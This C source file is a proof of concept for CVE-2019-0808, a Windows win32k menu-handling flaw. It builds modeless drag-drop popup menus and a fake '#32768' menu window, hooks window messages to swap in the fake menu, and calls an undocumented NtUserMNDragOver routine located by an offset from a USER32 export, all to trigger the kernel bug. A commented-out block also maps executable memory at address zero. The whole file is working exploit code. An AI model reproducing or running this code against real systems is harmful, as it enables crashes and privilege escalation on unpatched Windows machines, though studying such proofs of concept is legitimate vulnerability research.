#include "stdafx.h"
#include "windows.h"

#define WM_MN_FINDMENUWINDOWFROMPOINT 0x1EB

typedef int (WINAPI *NTUserMNDragOver)(PPOINT p, CHAR *buf);
NTUserMNDragOver pfnNtUserMNDragOver = 0;

typedef NTSTATUS(WINAPI *NTAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
);
NTAllocateVirtualMemory pfnNtAllocateVirtualMemory = 0;

HWND hWndFakeMenu;
BOOL bIsDefWndProc = TRUE;
BOOL bOnDraging = FALSE;

UINT iMenuCreated = 0;

VOID CALLBACK DisplayEventProc(HWINEVENTHOOK hWinEventHook,DWORD event,HWND hwnd,LONG idObject,LONG idChild,DWORD idEventThread,DWORD dwmsEventTime)
{
	switch (iMenuCreated)
	{
	case 0:
		SendMessageW(hwnd, WM_LBUTTONDOWN, 0, 0x00050005);
		break;
	case 1:
		SendMessageW(hwnd, WM_MOUSEMOVE, 0, 0x00060006);
		break;
	}
	printf("[*] MSG\n");
	iMenuCreated++;
}

HWND hWndMain;

LRESULT WINAPI SubMenuProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == WM_MN_FINDMENUWINDOWFROMPOINT)
	{
		SetWindowLongPtr(hwnd, GWLP_WNDPROC, (ULONG64)DefWindowProc);
		return (ULONG64)hWndFakeMenu;
	}
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK WindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
	tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;

	if (!bOnDraging) {
		return CallNextHookEx(0, code, wParam, lParam);
	}
	if ((cwp->message == WM_MN_FINDMENUWINDOWFROMPOINT))
	{
		bIsDefWndProc = FALSE;
		printf("[*] HWND: %p \n", cwp->hwnd);
		SetWindowLongPtr(cwp->hwnd, GWLP_WNDPROC, (ULONG64)SubMenuProc);
	}
	return CallNextHookEx(0, code, wParam, lParam);
}


int main()
{
	printf("\n");
	printf("////////////////////////////////////////////////////////\n");
	printf("//                                                    //\n");
	printf("//             CVE-2019-0808 POC	                  //\n");
	printf("//                                  Date  : 2019/3/15 //\n");
	printf("//                                  Author: ze0r      //\n");
	printf("////////////////////////////////////////////////////////\n\n");

	
	HMENU hMenuRoot = CreatePopupMenu();
	HMENU hMenuSub = CreatePopupMenu();
	HINSTANCE hInst = GetModuleHandleA(NULL);
	//pfnNtUserMNDragOver = (NTUserMNDragOver)((ULONG64)GetProcAddress(LoadLibraryA("USER32.dll"), "MenuItemFromPoint") + 0x3A);
	pfnNtUserMNDragOver = (NTUserMNDragOver)((ULONG64)GetProcAddress(LoadLibraryA("USER32.dll"), "MenuItemFromPoint") - 0x20);
	pfnNtAllocateVirtualMemory = (NTAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
	SetWindowsHookEx(WH_CALLWNDPROC, (HOOKPROC)WindowHookProc, hInst, GetCurrentThreadId());
	SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,hInst,DisplayEventProc,GetCurrentProcessId(),GetCurrentThreadId(),0);

	/*DWORD Shellcode = 1;
	SIZE_T Size = 1024;
	pfnNtAllocateVirtualMemory(GetCurrentProcess(),(PVOID *)&Shellcode,0,&Size,MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,PAGE_EXECUTE_READWRITE);
	Shellcode = 0;
	*(PDWORD)Shellcode = 0;*/

	CHAR buf[0x100] = { 0 };
	POINT pt;
	pt.x = 2;
	pt.y = 2;

	hWndFakeMenu = CreateWindowA("#32768", "MN", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr);
	printf("[*] FakeMenu: %p \n", hWndFakeMenu);

	MENUINFO mi = { 0 };
	mi.cbSize = sizeof(MENUINFO);
	mi.fMask = MIM_STYLE;
	mi.dwStyle = MNS_MODELESS | MNS_DRAGDROP;
	SetMenuInfo(hMenuRoot, &mi);
	SetMenuInfo(hMenuSub, &mi);

	AppendMenuA(hMenuRoot, MF_BYPOSITION | MF_POPUP, (UINT_PTR)hMenuSub, "Root");
	AppendMenuA(hMenuSub, MF_BYPOSITION | MF_POPUP, 0, "Sub");

	WNDCLASSEXA wndClass = { 0 };
	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInst;
	wndClass.lpszMenuName = 0;
	wndClass.lpszClassName = "WNDCLASSMAIN";
	RegisterClassExA(&wndClass);
	hWndMain = CreateWindowA("WNDCLASSMAIN", "CVE", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr);

	TrackPopupMenuEx(hMenuRoot, 0, 0, 0, hWndMain, NULL);
	
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);

		if (iMenuCreated >= 1) {
			bOnDraging = TRUE;
			pfnNtUserMNDragOver(&pt, buf);
			break;
		}
	}
	
    return 0;
}

